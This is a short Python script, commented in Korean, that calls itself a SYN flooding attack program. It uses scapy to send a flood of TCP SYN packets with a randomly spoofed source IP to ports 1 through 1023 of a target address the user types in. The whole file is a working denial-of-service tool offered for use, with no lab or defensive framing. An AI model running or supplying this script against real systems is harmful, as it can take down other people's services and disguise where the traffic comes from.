#syn_flooding.py
#Syn flooding 공격 프로그램이다.

from scapy.all import *
from random import shuffle

#함수명: getRandomIP
#설  명: 무작위로 IP주소를 생성한다.
def getRandomIP():
    ipfactors=[x for x in range(256)] #0~255까지 생성하여 ipfactors에 저장
    tempip=[]
    for i in range(4):
        shuffle(ipfactors)
        tempip.append(str(ipfactors[0]))
    random_ip='.'.join(tempip)
    return random_ip

#함수명: synAttack
#설  명: SYN Flooding 공격을 수행한다.
def synAttack(target_ip):
    src_ip=getRandomIP()
    P_IP=IP(src=src_ip, dst=target_ip)
    P_TCP=TCP(dport=range(1,1024), flags='S')
    packet=P_IP/P_TCP
    srflood(packet, store=0)

print('*******[SYN FLOODING ATTACK]*******')
target_ip=input("공격할 IP주소를 입력하세요>> ")
synAttack(target_ip)

    
